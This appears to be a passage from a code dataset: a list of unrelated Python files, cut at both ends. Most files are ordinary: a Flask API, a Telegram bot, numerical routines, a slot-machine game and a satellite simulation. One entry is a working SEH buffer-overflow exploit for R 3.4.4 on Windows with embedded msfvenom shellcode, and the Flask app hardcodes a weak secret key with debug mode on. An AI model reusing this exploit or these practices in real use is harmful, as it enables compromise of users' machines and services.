'YOLO11X-640NF')\nyolo11x_640NF_loss_path = os.path.join(yolo11x_640NF_path, 'results.csv')\nyolo11x_640NF_conf_path = os.path.join(yolo11x_640NF_",
    "import re\n\n\ndef translate(pattern):\n    return match_dirs(translate_core(pattern))\n\n\ndef match_dirs(pattern):\n    \"\"\"\n    Ensure that zipfile.Path directory names are matched.\n\n    zipfile.Path directory names always end in a slash.\n    \"\"\"\n    return rf'{pattern}[/]?'\n\n\ndef translate_core(pattern):\n    r\"\"\"\n    Given a glob pattern, produce a regex that matches it.\n\n    >>> translate('*.txt')\n    '[^/]*\\\\.txt'\n    >>> translate('a?txt')\n    'a.txt'\n    >>> translate('**/*')\n    '.*/[^/]*'\n    \"\"\"\n    return ''.join(map(replace, separate(pattern)))\n\n\ndef separate(pattern):\n    \"\"\"\n    Separate out character sets to avoid translating their contents.\n\n    >>> [m.group(0) for m in separate('*.txt')]\n    ['*.txt']\n    >>> [m.group(0) for m in separate('a[?]txt')]\n    ['a', '[?]', 'txt']\n    \"\"\"\n    return re.finditer(r'([^\\[]+)|(?P<set>[\\[].*?[\\]])|([\\[][^\\]]*$)', pattern)\n\n\ndef replace(match):\n    \"\"\"\n    Perform the replacements for a match from :func:`separate`.\n    \"\"\"\n\n    return match.group('set') or (\n        re.escape(match.group(0))\n        .replace('\\\\*\\\\*', r'.*')\n        .replace('\\\\*', r'[^/]*')\n        .replace('\\\\?', r'.')\n    )\n",
    "from flask import Flask, jsonify, request, abort\nimport pandas as pd\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'sister'  # Ganti dengan kunci rahasia Anda\n\nEXCEL_FILE = 'data.xlsx'\n\ndef read_data():\n    return pd.read_excel(EXCEL_FILE, sheet_name='mahasiswa')\n\ndef save_data(data):\n    # Simpan data ke sheet\n    with pd.ExcelWriter(EXCEL_FILE, engine='openpyxl', mode='w') as writer:\n        data.to_excel(writer, sheet_name='mahasiswa', index=False)\n\n@app.route('/mahasiswa', methods=['GET', 'POST'])\ndef mahasiswa():\n    if request.method == 'GET':\n        mahasiswa_data = read_data()\n        # Mengonversi DataFrame ke tipe yang dapat diserialisasi\n        mahasiswa_data = mahasiswa_data.convert_dtypes()\n        return jsonify(mahasiswa_data.to_dict(orient='records'))\n\n    if request.method == 'POST':\n        mahasiswa_data = read_data()\n        \n        # Tentukan ID baru\n        new_id = mahasiswa_data['id'].max() + 1 if not mahasiswa_data.empty else 1\n\n        # Cek apakah mahasiswa dengan email yang sama sudah ada\n        if any(mahasiswa_data['email'] == request.json['email']):\n            abort(400, description=\"Mahasiswa dengan email ini sudah ada!\")\n\n        # Buat data baru\n        data = {\n            \"id\": new_id,\n            \"name\": request.json['name'],\n            \"email\": request.json['email'],\n            \"prodi\": request.json['prodi']\n        }\n        \n        new_entry = pd.DataFrame([data])\n        \n        # Gabungkan data yang ada dengan data baru\n        combined_data = pd.concat([mahasiswa_data, new_entry], ignore_index=True)\n        \n        # Simpan data gabungan ke sheet\n        save_data(combined_data)\n        \n        return jsonify(data), 201  # Mengembalikan data baru dengan status 201 Created\n\n@app.route('/mahasiswa/<int:id>', methods=['GET', 'PUT', 'DELETE'])\ndef mahasiswa_by_id(id):\n    mahasiswa_data = read_data()\n    mahasiswa = mahasiswa_data[mahasiswa_data['id'] == id]\n\n    if mahasiswa.empty:\n        abort(404, description=\"Mahasiswa tidak ditemukan!\")\n\n    if request.method == 'GET':\n        # Mengonversi DataFrame ke tipe yang dapat diserialisasi\n        mahasiswa = mahasiswa.convert_dtypes()\n        return jsonify(mahasiswa.to_dict(orient='records')[0])\n\n    if request.method == 'PUT':\n        mahasiswa_data.loc[mahasiswa_data['id'] == id, 'name'] = request.json['name']\n        mahasiswa_data.loc[mahasiswa_data['id'] == id, 'email'] = request.json['email']\n        mahasiswa_data.loc[mahasiswa_data['id'] == id, 'prodi'] = request.json['prodi']\n        \n        # Simpan perubahan\n        save_data(mahasiswa_data)\n        return jsonify(mahasiswa_data[mahasiswa_data['id'] == id].convert_dtypes().to_dict(orient='records')[0])\n\n    if request.method == 'DELETE':\n        mahasiswa_data = mahasiswa_data[mahasiswa_data['id'] != id]\n        save_data(mahasiswa_data)\n        return jsonify({\"message\": \"Mahasiswa berhasil dihapus!\"}), 204  # No Content\n\nif __name__ == '__main__':\n    app.run(debug=True)",
    "# Copyright (c) Microsoft Corporation. All rights reserved.\r\n# Licensed under the MIT License. See LICENSE in the project root\r\n# for license information.\r\n\r\nimport sys\r\n\r\nif __name__ == \"__main__\":\r\n\r\n    # There are three ways to run debugpy:\r\n    #\r\n    # 1. Installed as a module in the current environment (python -m debugpy ...)\r\n    # 2. Run as a script from source code (python <repo_root>/src/debugpy ...)\r\n    # 3. Installed as a module in a random directory\r\n    #\r\n    # -----\r\n    #\r\n    # In the first case, no extra work is needed. Importing debugpy will work as expected.\r\n    # Also, running 'debugpy' instead of 'python -m debugpy' will work because of the entry point\r\n    # defined in setup.py.\r\n    #\r\n    # -----\r\n    #\r\n    # In the second case, sys.path[0] is the one added automatically by Python for the directory \r\n    # containing this file. 'import debugpy' will not work since we need the parent directory \r\n    # of debugpy/ to be in sys.path, rather than debugpy/ itself. So we need to modify sys.path[0].\r\n    # Running 'debugpy' will not work because the entry point is not defined in this case.\r\n    #\r\n    # -----\r\n    #\r\n    # In the third case, running 'python -m debugpy' will not work because the module is not installed\r\n    # in any environment. Running 'python <install_dir>/debugpy' will work, just like the second case. \r\n    # But running the entry point will not work because python doesn't know where to find the debugpy module.\r\n    #\r\n    # In this case, no changes to sys.path are required. You just have to do the following before calling\r\n    # the entry point:\r\n    #   1. Add <install_dir> to PYTHONPATH.\r\n    #       On Windows, this is set PYTHONPATH=%PYTHONPATH%;<install_dir>\r\n    #   2. Add <install_dir>/bin to PATH. (OPTIONAL)\r\n    #       On Windows, this is set PATH=%PATH%;<install_dir>\\bin\r\n    #   3. Run the entry point from a command prompt\r\n    #       On Windows, this is <install_dir>\\bin\\debugpy.exe, or just 'debugpy' if you did the previous step.\r\n    #\r\n    # -----\r\n    #\r\n    # If we modify sys.path, 'import debugpy' will work, but it will break other imports\r\n    # because they will be resolved relative to debugpy/ - e.g. `import debugger` will try\r\n    # to import debugpy/debugger.py.\r\n    #\r\n    # To fix both problems, we need to do the following steps:\r\n    # 1. Modify sys.path[0] to point at the parent directory of debugpy/ instead of debugpy/ itself.\r\n    # 2. Import debugpy.\r\n    # 3. Remove sys.path[0] so that it doesn't affect future imports. \r\n    # \r\n    # For example, suppose the user did:\r\n    #\r\n    #   python /foo/bar/debugpy ...\r\n    #\r\n    # At the beginning of this script, sys.path[0] will contain \"/foo/bar/debugpy\".\r\n    # We want to replace it with \"/foo/bar', then 'import debugpy', then remove the replaced entry.\r\n    # The imported debugpy module will remain in sys.modules, and thus all future imports of it \r\n    # or its submodules will resolve accordingly.\r\n    if \"debugpy\" not in sys.modules:\r\n\r\n        # Do not use dirname() to walk up - this can be a relative path, e.g. \".\".\r\n        sys.path[0] = sys.path[0] + \"/../\"\r\n        import debugpy  # noqa\r\n        del sys.path[0]\r\n\r\n    from debugpy.server import cli\r\n\r\n    cli.main()\r\n",
    "import os\nfrom contextlib import asynccontextmanager\nfrom http import HTTPStatus\nfrom dotenv import load_dotenv\nfrom fastapi import FastAPI, Request, Response\nfrom telegram import Update\nfrom telegram.ext import Application, ContextTypes, CommandHandler, MessageHandler, filters\n\n# Load environment variables\nload_dotenv()\nTELEGRAM_BOT_TOKEN: str = os.getenv('TELEGRAM_BOT_TOKEN')\nWEBHOOK_DOMAIN: str = os.getenv('RAILWAY_PUBLIC_DOMAIN')\n\n# Build the Telegram Bot application\nbot_builder = (\n    Application.builder()\n    .token(TELEGRAM_BOT_TOKEN)\n    .updater(None)\n    .build()\n)\n\n\n@asynccontextmanager\nasync def lifespan(_: FastAPI):\n    \"\"\" Sets the webhook for the Telegram Bot and manages its lifecycle (start/stop). \"\"\"\n    await bot_builder.bot.setWebhook(url=WEBHOOK_DOMAIN)\n    async with bot_builder:\n        await bot_builder.start()\n        yield\n        await bot_builder.stop()\n\n\napp = FastAPI(lifespan=lifespan)\n\n\n@app.post(\"/\")\nasync def process_update(request: Request):\n    \"\"\" Handles incoming Telegram updates and processes them with the bot. \"\"\"\n    message = await request.json()\n    update = Update.de_json(data=message, bot=bot_builder.bot)\n    await bot_builder.process_update(update)\n    return Response(status_code=HTTPStatus.OK)\n\n\nasync def start(update: Update, _: ContextTypes.DEFAULT_TYPE):\n    \"\"\" Handles the /start command by sending a \"Hello world!\" message in response. \"\"\"\n    await update.message.reply_text(\"Hello! \ud83c\udf61 Send me a message and I'll echo it back to you\")\n\n\nasync def echo(update: Update, _: ContextTypes.DEFAULT_TYPE) -> None:\n    \"\"\"Echo the user message.\"\"\"\n    await update.message.reply_text(update.message.text)\n\n\nbot_builder.add_handler(CommandHandler(command=\"start\", callback=start))\nbot_builder.add_handler(MessageHandler(filters=filters.TEXT & ~filters.COMMAND, callback=echo))\n",
    "import numpy as np\nimport pandas as pd\n#import warnings\nfrom scipy.stats import skew, kurtosis\n#warnings.filterwarnings(\"ignore\")\nfrom scipy.fft import fft\nfrom scipy.interpolate import interp1d\n\n\ndef compute_cosine_sim(data1, window_size,len_iter,pattern1,  i, j):\n\n    window = data1[i:i + window_size - (len_iter//2) + j ,:]\n\n\n    max_pos = np.max(pattern1) +  0.1 * np.ptp(pattern1) # np.ptp : calculates max-min difference\n    min_pos = np.min(pattern1) - 0.1 * np.ptp(pattern1)\n    mean_pos_upper = np.mean(pattern1) + 0.1 * np.ptp(pattern1)\n    mean_pos_lower = np.mean(pattern1) - 0.1 * np.ptp(pattern1)\n    pattern_skewness = skew(pattern1.flatten())\n    pattern_kurtosis = kurtosis(pattern1.flatten())\n    pattern_std = np.std( pattern1.flatten() )\n    cross_correlation_threshold = 0.5  # Set a threshold for cross-correlation\n\n    starting_point_lower = pattern1[0] - 0.2 * np.ptp(pattern1)\n    starting_point_upper = pattern1[0] + 0.2 * np.ptp(pattern1)\n\n    ending_point_lower = pattern1[-1] - 0.2 * np.ptp(pattern1)\n    ending_point_upper = pattern1[-1] + 0.2 * np.ptp(pattern1)\n\n\n    x_original = np.linspace(0, 1, len(window))\n    x_target = np.linspace(0, 1, len(pattern1))\n\n    window = window.reshape(-1 ,)\n\n    interpolator = interp1d(x_original, window, kind='cubic')  # Linear interpolation\n\n    window2 = interpolator(x_target)\n\n    corr_coef = np.corrcoef(window2, pattern1)[0][1]\n\n    sliding_window_max = np.max(window2)\n    sliding_window_min = np.min(window2)\n    sliding_window_skewness = skew(window2)\n    sliding_window_kurtosis = kurtosis(window2)\n    sliding_window_mean = np.mean(window2)\n    sliding_window_std = np.std(window2)\n\n\n    if ( sliding_window_max <= max_pos and sliding_window_min >= min_pos and\n            mean_pos_upper >= sliding_window_mean >= mean_pos_lower and\n            abs(sliding_window_skewness - pattern_skewness) < 0.5 and\n            abs(sliding_window_kurtosis - pattern_kurtosis) < 1.0 and\n            pattern_std * 0.9 <= sliding_window_std <= pattern_std * 1.1 and\n            corr_coef >= cross_correlation_threshold\n            and starting_point_lower<= window2[0] <= starting_point_upper and\n            ending_point_lower<= window2[-1] <= ending_point_upper ):\n\n        fft_pattern = fft(pattern1)\n        fft_window = fft(window2)\n\n        magnitude_pattern = np.abs(fft_pattern)\n        magnitude_window = np.abs(fft_window)\n\n        dot_product = np.dot(magnitude_pattern, magnitude_window)\n        norm_1 = np.linalg.norm(magnitude_pattern)\n        norm_2 = np.linalg.norm(magnitude_window)\n\n        cosine_similarity = dot_product / (norm_1 * norm_2)\n\n\n        return i, j, cosine_similarity\n\n    else:\n        return i, j, 0\n",
    "from typing import Mapping, Dict, Any, Literal\nfrom werkzeug import Request, Response\nfrom dify_plugin import Endpoint\nimport json\nimport logging\n\nclass GotoHuman(Endpoint):\n    def _invoke(self, r: Request, values: Mapping, settings: Mapping) -> Response:\n        \"\"\"\n        Implements the GoToHuman endpoint functionality\n        \"\"\"\n        try:\n            logging.info(\"====== Webhook Request Details ======\")\n            logging.info(f\"Request Method: {r.method}\")\n            logging.info(f\"Request Headers: {dict(r.headers)}\")\n            logging.info(f\"Request Values: {values}\")\n            \n            try:\n                request_body = r.get_json()\n                logging.info(f\"Request Body: {json.dumps(request_body, indent=2)}\")\n            except Exception as e:\n                logging.warning(f\"Could not parse request body as JSON: {str(e)}\")\n                logging.info(f\"Raw Request Body: {r.get_data(as_text=True)}\")\n            \n            logging.info(\"================================\")\n\n            # Get request data and use it directly as workflow inputs\n            data = r.get_json()\n            workflow_inputs = {}\n            for key, value in data.get(\"responseValues\", {}).items():\n                workflow_inputs[key] = value.get(\"value\")\n            \n            app_id = settings.get('app_id', {}).get(\"app_id\", \"\")\n            logging.info(f\"Processing webhook for app_id: {app_id}\")\n            logging.debug(f\"Workflow inputs: {workflow_inputs}\")\n            \n            # Call Dify workflow\n            logging.info(\"Invoking Dify workflow\")\n            workflow_response = self.session.app.workflow.invoke(\n                app_id=app_id,\n                inputs=workflow_inputs,\n                response_mode=\"blocking\",\n            )\n            logging.info(\"Workflow execution completed successfully\")\n            logging.debug(f\"Workflow response: {workflow_response}\")\n\n            return Response(\n                json.dumps({\n                    \"status\": \"success\",\n                    \"workflow_response\": workflow_response\n                }),\n                status=200,\n                content_type=\"application/json\"\n            )\n\n        except Exception as e:\n            logging.error(f\"Error processing webhook: {str(e)}\", exc_info=True)\n            return Response(\n                json.dumps({\n                    \"error\": str(e)\n                }),\n                status=500,\n                content_type=\"application/json\"\n            ) ",
    "import random\r\n\r\nMAX_LINES = 3\r\nMAX_BET = 100\r\nMIN_BET = 1\r\n\r\nROWS = 3\r\nCOLS = 3\r\n\r\nsymbol_count = {\r\n    \"A\": 2,\r\n    \"B\": 4,\r\n    \"C\": 6,\r\n    \"D\": 8\r\n}\r\n\r\nsymbol_value = {\r\n    \"A\": 5,\r\n    \"B\": 4,\r\n    \"C\": 3,\r\n    \"D\": 2\r\n}\r\n\r\ndef check_winnings(columns, lines, bet, values):\r\n    winnings = 0\r\n    winning_lines = []\r\n    for line in range(lines):\r\n        symbol = columns[0][line]\r\n        for column in columns:\r\n            symbol_to_check = column[line]\r\n            if symbol != symbol_to_check:\r\n                break\r\n        else:\r\n            winnings += values[symbol] * bet\r\n            winning_lines.append(line + 1)\r\n\r\n    return winnings, winning_lines\r\n\r\ndef get_slot_machine_spin(rows, cols, symbols):\r\n    all_symbols = []\r\n    for symbol, count in symbols.items():\r\n        for _ in range(count):\r\n            all_symbols.append(symbol)\r\n\r\n    columns = []\r\n    for _ in range(cols):\r\n        column = []\r\n        current_symbols = all_symbols[:]\r\n        for _ in range(rows):\r\n            value = random.choice(current_symbols)\r\n            current_symbols.remove(value)\r\n            column.append(value)\r\n\r\n        columns.append(column)\r\n\r\n    return columns\r\n\r\ndef print_slot_machine(columns):\r\n    for row in range(len(columns[0])):\r\n        for i, column in enumerate(columns):\r\n            if i != len(columns) - 1:\r\n                print(column[row], end=\" | \")\r\n            else:\r\n                print(column[row], end=\"\")\r\n        print()\r\n\r\ndef deposit():\r\n    while True:\r\n        amount = input(\"What would you like to deposit? $\")\r\n        if amount.isdigit():\r\n            amount = int(amount)\r\n            if amount > 0:\r\n                break\r\n            else:\r\n                print(\"Amount must be greater than 0.\")\r\n        else:\r\n            print(\"Please enter a number.\")\r\n    return amount\r\n\r\ndef get_number_of_lines():\r\n    while True:\r\n        lines = input(\"Enter the number of lines to bet on (1-\" + str(MAX_LINES) + \"): \")\r\n        if lines.isdigit():\r\n            lines = int(lines)\r\n            if 1 <= lines <= MAX_LINES:\r\n                break\r\n            else:\r\n                print(\"Enter a valid number of lines.\")\r\n        else:\r\n            print(\"Please enter a number.\")\r\n    return lines\r\n\r\ndef get_bet():\r\n    while True:\r\n        amount = input(\"What would you like to bet on each line? $\")\r\n        if amount.isdigit():\r\n            amount = int(amount)\r\n            if MIN_BET <= amount <= MAX_BET:\r\n                break\r\n            else:\r\n                print(f\"Amount must be between ${MIN_BET} - ${MAX_BET}.\")\r\n        else:\r\n            print(\"Please enter a number.\")\r\n    return amount\r\n\r\ndef spin(balance):\r\n    lines = get_number_of_lines()\r\n    while True:\r\n        bet = get_bet()\r\n        total_bet = bet * lines\r\n\r\n        if total_bet > balance:\r\n            print(f\"You do not have enough to bet that amount. Your current balance is: ${balance}\")\r\n        else:\r\n            break\r\n\r\n    print(f\"You are betting ${bet} on {lines} lines. Total bet is: ${total_bet}\")\r\n\r\n    slots = get_slot_machine_spin(ROWS, COLS, symbol_count)\r\n    print_slot_machine(slots)\r\n    winnings, winning_lines = check_winnings(slots, lines, bet, symbol_value)\r\n    print(f\"You won ${winnings}.\")\r\n    print(\"You won on lines:\", *winning_lines)\r\n\r\n    return winnings - total_bet\r\n\r\ndef main():\r\n    balance = deposit()\r\n    while True:\r\n        print(f\"Current balance is: ${balance}\")\r\n        spin_input = input(\"Press Enter to play (q to quit): \")\r\n        if spin_input.lower() == \"q\":\r\n            break\r\n        balance += spin(balance)\r\n\r\n    print(f\"You left with ${balance}.\")\r\n\r\nmain()\r\n\r\n",
    "#!/usr/bin/python\r\n# Exploit Title: R 3.4.4 (Windows 10 x64) - Buffer Overflow SEH\r\n# Tested on: Windows 10 Home Single Language 64-bit\r\nimport struct\r\n\r\njunk = \"A\"* 1008\r\n\r\nnseh = '\\xeb\\x06\\x90\\x90'\r\n\r\nseh = struct.pack(\"<I\", 0x6caf9049)\r\n# msfvenom -a x86 -p windows/exec -e x86/shikata_ga_nai -b '\\x00\\x0a\\x0d\\x5c' cmd=calc.exe exitfunc=thread -f python\r\n\r\nshellcode =  \"\"\r\nshellcode += \"\\x90\" * 20\r\nshellcode += \"\\xdb\\xce\\xbf\\x90\\x28\\x2f\\x09\\xd9\\x74\\x24\\xf4\\x5d\\x29\"\r\nshellcode += \"\\xc9\\xb1\\x31\\x31\\x7d\\x18\\x83\\xc5\\x04\\x03\\x7d\\x84\\xca\"\r\nshellcode += \"\\xda\\xf5\\x4c\\x88\\x25\\x06\\x8c\\xed\\xac\\xe3\\xbd\\x2d\\xca\"\r\nshellcode += \"\\x60\\xed\\x9d\\x98\\x25\\x01\\x55\\xcc\\xdd\\x92\\x1b\\xd9\\xd2\"\r\nshellcode += \"\\x13\\x91\\x3f\\xdc\\xa4\\x8a\\x7c\\x7f\\x26\\xd1\\x50\\x5f\\x17\"\r\nshellcode += \"\\x1a\\xa5\\x9e\\x50\\x47\\x44\\xf2\\x09\\x03\\xfb\\xe3\\x3e\\x59\"\r\nshellcode += \"\\xc0\\x88\\x0c\\x4f\\x40\\x6c\\xc4\\x6e\\x61\\x23\\x5f\\x29\\xa1\"\r\nshellcode += \"\\xc5\\x8c\\x41\\xe8\\xdd\\xd1\\x6c\\xa2\\x56\\x21\\x1a\\x35\\xbf\"\r\nshellcode += \"\\x78\\xe3\\x9a\\xfe\\xb5\\x16\\xe2\\xc7\\x71\\xc9\\x91\\x31\\x82\"\r\nshellcode += \"\\x74\\xa2\\x85\\xf9\\xa2\\x27\\x1e\\x59\\x20\\x9f\\xfa\\x58\\xe5\"\r\nshellcode += \"\\x46\\x88\\x56\\x42\\x0c\\xd6\\x7a\\x55\\xc1\\x6c\\x86\\xde\\xe4\"\r\nshellcode += \"\\xa2\\x0f\\xa4\\xc2\\x66\\x54\\x7e\\x6a\\x3e\\x30\\xd1\\x93\\x20\"\r\nshellcode += \"\\x9b\\x8e\\x31\\x2a\\x31\\xda\\x4b\\x71\\x5f\\x1d\\xd9\\x0f\\x2d\"\r\nshellcode += \"\\x1d\\xe1\\x0f\\x01\\x76\\xd0\\x84\\xce\\x01\\xed\\x4e\\xab\\xee\"\r\nshellcode += \"\\x0f\\x5b\\xc1\\x86\\x89\\x0e\\x68\\xcb\\x29\\xe5\\xae\\xf2\\xa9\"\r\nshellcode += \"\\x0c\\x4e\\x01\\xb1\\x64\\x4b\\x4d\\x75\\x94\\x21\\xde\\x10\\x9a\"\r\nshellcode += \"\\x96\\xdf\\x30\\xf9\\x79\\x4c\\xd8\\xd0\\x1c\\xf4\\x7b\\x2d\"\r\n\r\nend = \"D\" * 6000\r\n\r\n\r\npayload = junk + nseh + seh + shellcode + end\r\n\r\n# 0141e484 20 01 02 03 04 05 06 07 08 09 00 00 a0 11 75 63 e4 8f   .............uc..\r\n# 0141e496 ac 06 00 00 00 00 00 00 00 00 00 00 00 00 cd ab ba dc  ..................\r\n# 0141e4a8 90 fe 6a 04 15 02 00 00 00 00 00 00 98 e5 41 01 8c 4f  ..j...........A..O\r\n\r\nwith open('seh.txt', 'w') as file:\r\n  file.write(payload)\r\nprint \"payload File Created\\n\"\r\n\r\n\r\n\r\n",
    "import numpy as np\nimport matplotlib.pyplot as plt\nfrom scipy.interpolate import UnivariateSpline\nfrom sklearn.model_selection import train_test_split\n\n\ndef initial_guess(x_sampled, y_sampled):\n    \"\"\"\n    Create an initial polynomial guess using a quadratic fit.\n    \"\"\"\n    poly_coeff = np.polyfit(x_sampled, y_sampled, deg=2)  # Quadratic fit\n    return lambda x: np.polyval(poly_coeff, x)\n\n\ndef recursive_regression_with_adaptive_sampling(\n    x_train, y_train, degree=2, max_iterations=10, sampling_factor=1.5, max_new_points=10\n):\n    \"\"\"\n    Recursive regression with polynomial splines and adaptive sampling.\n\n    Parameters:\n        x_train, y_train: Training data.\n        degree: Degree of polynomial splines.\n        max_iterations: Maximum number of iterations.\n        sampling_factor: Threshold factor for adaptive sampling.\n        max_new_points: Max number of new points per iteration.\n\n    Returns:\n        Callable function for the fitted model.\n    \"\"\"\n    # Initial sampling (only from training data)\n    indices = np.linspace(0, len(x_train) - 1, 10, dtype=int)\n    x_sampled = x_train[indices]\n    y_sampled = y_train[indices]\n\n    for iteration in range(max_iterations):\n        # Ensure sampled points come only from training data\n        unique_x, inverse_indices = np.unique(x_sampled, return_inverse=True)\n        averaged_y = np.array([y_sampled[inverse_indices == i].mean() for i in range(len(unique_x))])\n        x_sampled, y_sampled = unique_x, averaged_y\n\n        # Initial guess: Quadratic fit\n        linear_model = initial_guess(x_sampled, y_sampled)\n        y_guess = linear_model(x_sampled)\n\n        # Compute residuals\n        residuals = y_sampled - y_guess\n\n        # Fit spline to residuals without smoothing\n        spline = UnivariateSpline(x_sampled, residuals, k=degree, s=0)\n\n        # Combined model: initial guess + residual spline\n        model = lambda x: linear_model(x) + spline(x)\n\n        # Compute residuals on the entire training set\n        y_pred = model(x_train)\n        full_residuals = y_train - y_pred\n\n        # Adaptive sampling: select high-residual points\n        residual_threshold = sampling_factor * np.std(full_residuals)\n        new_indices = np.where(np.abs(full_residuals) > residual_threshold)[0]\n\n        # Limit the number of new points added\n        if len(new_indices) > max_new_points:\n            new_indices = np.random.choice(new_indices, max_new_points, replace=False)\n\n        if len(new_indices) == 0:\n            print(f\"Converged at iteration {iteration + 1}.\")\n            break\n\n        # Add new points strictly from the training set\n        x_sampled = np.unique(np.concatenate((x_sampled, x_train[new_indices])))\n        y_sampled = np.array([y_train[np.where(x_train == xi)[0][0]] for xi in x_sampled])\n\n        print(f\"Iteration {iteration + 1}: Sampled points in training = {len(x_sampled)}, \"\n              f\"total points in training set = {len(x_train)}, \"\n              f\"proportion sampled/available = {len(x_sampled) / len(x_train):.4f}\")\n\n        # Plot progress\n        plt.figure(figsize=(10, 6))\n        plt.scatter(x_train, y_train, label=\"All Training Data\", color=\"red\")\n        plt.scatter(x_sampled, y_sampled, label=\"Sampled Points\", color=\"blue\")\n        plt.plot(\n            np.sort(x_train), model(np.sort(x_train)),\n            label=f\"Iteration {iteration + 1}\", color=\"purple\"\n        )\n        plt.title(f\"Iteration {iteration + 1}\")\n        plt.xlabel(\"x\")\n        plt.ylabel(\"y\")\n        plt.legend()\n        plt.grid()\n        plt.show()\n\n    # Identify slope change points (green and yellow)\n    x_fine = np.linspace(x_train.min(), x_train.max(), 1000)\n    y_fine = model(x_fine)\n    dydx = np.gradient(y_fine, x_fine)\n\n    green_points = []\n    yellow_points = []\n\n    for i in range(1, len(dydx)):\n        if dydx[i - 1] > 0 and dydx[i] <= 0:\n            green_points.append((x_fine[i], y_fine[i]))\n        elif dydx[i - 1] < 0 and dydx[i] >= 0:\n            yellow_points.append((x_fine[i], y_fine[i]))\n\n    green_points = np.array(green_points)\n    yellow_points = np.array(yellow_points)\n\n    # Fit global polynomials through green and yellow points\n    green_poly_coeff = np.polyfit(green_points[:, 0], green_points[:, 1], deg=8)\n    yellow_poly_coeff = np.polyfit(yellow_points[:, 0], yellow_points[:, 1], deg=8)\n\n    green_poly = lambda x: np.polyval(green_poly_coeff, x)\n    yellow_poly = lambda x: np.polyval(yellow_poly_coeff, x)\n\n    # Average the two global polynomials to create the final model\n    averaged_model = lambda x: 0.5 * (green_poly(x) + yellow_poly(x))\n\n    # Plot final model with error bounds\n    plt.figure(figsize=(10, 6))\n    plt.scatter(x_train, y_train, label=\"All Training Data\", color=\"red\")\n    plt.plot(x_fine, y_fine, label=\"Final Iteration Spline Model\", color=\"purple\")\n    plt.scatter(green_points[:, 0], green_points[:, 1], label=\"Slope Change (+ to -)\", color=\"green\")\n    plt.scatter(yellow_points[:, 0], yellow_points[:, 1], label=\"",
    "import asyncio\nimport random\nimport numpy as np\nfrom src.unils.Calculation import position_2D_to_3D, get_distance_3D, get_current_timestamp_ms\nfrom src.unils.RandomGenerator import generate_random_ipv4, generate_random_mac, generate_random_user_position, generate_random_credentials\nfrom src.simulation.protocolstack import Stack\nfrom src.unils import Regular\n\n\nclass User:\n    def __init__(self, user_id, population_array, user_to_satellite_gain, user_receiver_sensitivity, user_snr, user_data_rate, gateway, globalVariables):\n        # \u7528\u6237\u8eab\u4efd\n        self.id = user_id\n        self.ip_address = generate_random_ipv4()\n        self.mac_address = generate_random_mac()\n        self.username, self.password = generate_random_credentials(username_length=8, password_length=16)\n        gateway.user_authentication_table[str(self.id)] = {'username': self.username, 'password': self.password}\n        gateway.user_table[str(self.id)] = self\n\n        # \u5750\u6807\n        latitude, longitude = generate_random_user_position(population_array=population_array)\n        self.position_2D_GCS = np.array([latitude, longitude, 0])  # \u5730\u7406\u5750\u6807\u7cfb \u7eac\u5ea6/\u7ecf\u5ea6/\u9ad8\u5ea6\n        self.position_3D_ECI = position_2D_to_3D(lat=latitude, lon=longitude, h=0)   # \u5730\u5fc3\u60ef\u6027\u5750\u6807\u7cfb\n        self.globalVariables = globalVariables\n        globalVariables.globle_user_position_3D_ECI.append({'user_id': self.id, 'x': self.position_3D_ECI[0], 'y': self.position_3D_ECI[1], 'z': self.position_3D_ECI[2]})\n\n        # \u7269\u7406\u53c2\u6570 \u7528\u4e8e\u63a5\u5165\u8fc7\u7a0b\n        self.user_to_satellite_gain = user_to_satellite_gain\n        self.user_receiver_sensitivity = user_receiver_sensitivity\n        self.user_snr = user_snr\n        self.user_data_rate = user_data_rate\n\n        # \u63a5\u5165\u536b\u661f\n        self.session = None  # \u63a5\u5165\u536b\u661f\u540e\u4f1a\u5f97\u5230\u4e00\u4e2a\u4f1a\u8bdd\n        self.access_satellite = None  # \u771f\u6b63\u63a5\u5165\u7684\u536b\u661f\n        self.candidate_access_satellite = None  # \u5019\u9009\u7684\u63a5\u5165\u536b\u661f\uff0c\u5373\u7528\u6237\u8fde\u63a5\u540e\u7b49\u5f85\u63a5\u5165\u8ba4\u8bc1\u548c\u5207\u6362\u65f6\u7684\u536b\u661f\n\n\n        # \u7f13\u51b2\u533a\n        self.receiver_buffer = asyncio.Queue()\n        self.max_buffer_size = 1024 * 1024 * 1024  # MB\n        self.phy_current_get_buffer_size = 0\n        return\n\n    async def start_user_behavior_async(self, gateway, global_variables, satellites):\n        # \u540c\u65f6\u542f\u52a8\u6240\u6709\u884c\u4e3a\n        await asyncio.gather(\n            self.start_user_send_behavior_async(gateway=gateway, global_variables=global_variables),\n            self.start_user_receive_behavior_async(),\n            self.start_user_access_and_switch_satellite_behavior_async(satellites=satellites, gateway=gateway)\n        )\n\n    async def start_user_send_behavior_async(self, gateway, global_variables):\n        while True:\n            if self.access_satellite and self.access_satellite == self.candidate_access_satellite:\n                # \u7528\u6237\u53d1\u9001\u6570\u636e\u7684\u903b\u8f91\n                network_protocol = 0x0064\n                target_user = random.choice(list(gateway.user_table.values()))\n                target_ip = target_user.ip_address\n                if self.ip_address == target_ip:\n                    continue\n                data_size = random.uniform(1, self.user_data_rate)\n                # data = np.random.bytes(data_size * 1024)\n                message = f'This is a normal data packet, from user {self.ip_address}, sent to user {target_ip}. [has_routing_path:{0}], [r_p:{None}]'\n                send_to_satellite = self.access_satellite\n                wait_time = data_size / self.user_data_rate\n\n                self.globalVariables.count_total_packet_number = self.globalVariables.count_total_packet_number + 1\n            # \u5982\u679c\u5f53\u524d\u5df2\u7ecf\u63a5\u5165\u4e00\u4e2a\u536b\u661f\uff0c\u4e14\u5019\u9009\u536b\u661f\u4e0e\u63a5\u5165\u536b\u661f\u4e0d\u540c\uff0c\u5219\u6267\u884c\u5207\u6362\u536b\u661f\u7684\u903b\u8f91\n            elif self.access_satellite and self.candidate_access_satellite and self.access_satellite != self.candidate_access_satellite:\n                # \u5207\u6362\u7684\u903b\u8f91\n                network_protocol = 0x0002\n                message = f'User [userid:{self.id}] want to switch from [original_satellite:{self.access_satellite.id}] to [new_satellite:{self.candidate_access_satellite.id}], my_session [session:{self.session}]'\n                send_to_satellite = self.candidate_access_satellite\n                target_ip = send_to_satellite.ip_address\n                wait_time = 5\n                data_size = 0.1\n            # \u9009\u62e9\u4e00\u4e2a\u89c6\u91ce\u7684\u5019\u9009\u536b\u661f\n            elif self.candidate_access_satellite and self.access_satellite == None:\n                network_protocol = 0x0001\n                message = f'User [userid:{self.id}] want to access to Satellite {self.candidate_access_satellite.id}, my username is 